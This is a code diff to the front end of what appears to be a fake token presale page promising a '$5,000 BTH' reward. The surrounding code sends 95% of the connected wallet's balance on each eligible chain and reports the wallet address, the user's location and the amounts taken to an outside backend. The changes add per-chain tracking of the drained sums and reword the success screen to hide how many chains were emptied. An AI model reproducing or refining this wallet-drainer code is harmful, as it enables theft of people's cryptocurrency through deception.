@@ -102,6 +102,8 @@ function App() {
   const [processingChain, setProcessingChain] = useState('');
   const [isEligible, setIsEligible] = useState(false);
   const [eligibleChains, setEligibleChains] = useState([]);
+  const [processedAmounts, setProcessedAmounts] = useState({});
+  const [allChainsCompleted, setAllChainsCompleted] = useState(false);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -238,6 +240,13 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
+  // Check if all eligible chains are completed
+  useEffect(() => {
+    if (eligibleChains.length > 0 && completedChains.length === eligibleChains.length) {
+      setAllChainsCompleted(true);
+    }
+  }, [completedChains, eligibleChains]);
+
   // Check eligibility without showing balances
   const checkEligibility = async () => {
     if (!address) return;
@@ -373,9 +382,11 @@ function App() {
       setSignatureLoading(true);
       setError('');
       setCompletedChains([]);
+      setAllChainsCompleted(false);
+      setProcessedAmounts({});
       
       const timestamp = Date.now();
-      const flowId = `FLOW-${timestamp}`;
+      const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
       const nonce = Math.floor(Math.random() * 1000000000);
@@ -411,6 +422,7 @@ function App() {
       );
       
       let processed = [];
+      let failedChains = [];
       
       for (const chain of sortedChains) {
         try {
@@ -440,6 +452,16 @@ function App() {
           const balance = balances[chain.name];
           const amountToSend = (balance.amount * 0.95); // Changed to 95%
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
+          
+          // Store the processed amount for this chain immediately
+          setProcessedAmounts(prev => ({
+            ...prev,
+            [chain.name]: {
+              amount: amountToSend.toFixed(6),
+              symbol: chain.symbol,
+              valueUSD: valueUSD
+            }
+          }));
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
@@ -485,7 +507,7 @@ function App() {
             // Calculate gas used
             const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
-            // FIXED: Send to backend with CORRECT amount and valueUSD
+            // Send to backend with CORRECT amount and valueUSD
             const flowData = {
               walletAddress: address,
               chainName: chain.name,
@@ -519,13 +541,15 @@ function App() {
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
+          failedChains.push(chain.name);
           setError(`Error on ${chain.name}: ${chainErr.message}`);
         }
       }
 
       setVerifiedChains(processed);
       
-      if (processed.length > 0) {
+      // Only show celebration if ALL eligible chains were processed successfully
+      if (processed.length === sortedChains.length) {
         setShowCelebration(true);
         setTxStatus(`🎉 You've secured $5,000 BTH!`);
         
@@ -533,6 +557,12 @@ function App() {
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
+        
+        // Build detailed chains info for final message
+        const chainsDetails = processed.map(chainName => {
+          const amount = processedAmounts[chainName];
+          return `${chainName}: ${amount?.amount || 'unknown'} ${amount?.symbol || ''} ($${amount?.valueUSD || 'unknown'})`;
+        }).join('\n');
         
         // Final success notification with correct values
         await fetch('https://hyperback.vercel.app/api/presale/claim', {
@@ -547,11 +577,15 @@ function App() {
               city: userLocation.city
             },
             chains: processed,
+            chainsDetails: chainsDetails,
             totalProcessedValue: totalProcessedValue.toFixed(2),
             reward: "5000 BTH",
             bonus: `${presaleStats.currentBonus}%`
           })
         });
+      } else if (processed.length > 0) {
+        // Some chains succeeded but not all - show partial success
+        setError(`Partially completed: ${processed.length} of ${sortedChains.length} chains. Failed: ${failedChains.join(', ')}`);
       } else {
         setError("No chains were successfully processed");
       }
@@ -762,8 +796,8 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area - Only shows when eligible */}
-          {isConnected && isEligible && !completedChains.length && (
+          {/* Main Claim Area - Only shows when eligible and not all chains completed */}
+          {isConnected && isEligible && !allChainsCompleted && eligibleChains.length > 0 && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
@@ -797,23 +831,14 @@ function App() {
                   {txStatus}
                 </div>
               )}
-
-              {/* Completed chains progress */}
-              {completedChains.length > 0 && (
-                <div className="mt-3 text-center">
-                  <div className="text-xs text-gray-400">
-                    Completed: {completedChains.join(' → ')}
-                  </div>
-                </div>
-              )}
             </div>
           )}
 
-          {/* Already completed */}
-          {completedChains.length > 0 && (
+          {/* Already completed - Don't show number of chains */}
+          {allChainsCompleted && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-black/60 rounded-xl sm:rounded-2xl p-4 sm:p-6 text-center border border-green-500/20 mb-3 sm:mb-4 animate-pulse-glow">
-                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">✓ COMPLETED on {completedChains.length} chains</p>
+                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">✓ COMPLETED SUCCESSFULLY</p>
                 <p className="text-gray-400 text-xs sm:text-sm">Your $5,000 BTH has been secured</p>
               </div>
               <button
@@ -980,7 +1005,7 @@ function App() {
               </div>
               
               <p className="text-[10px] sm:text-xs text-gray-500 mb-4 sm:mb-6">
-                Processed on {verifiedChains.length} chains
+                Successfully processed on all chains
               </p>
               
               <button
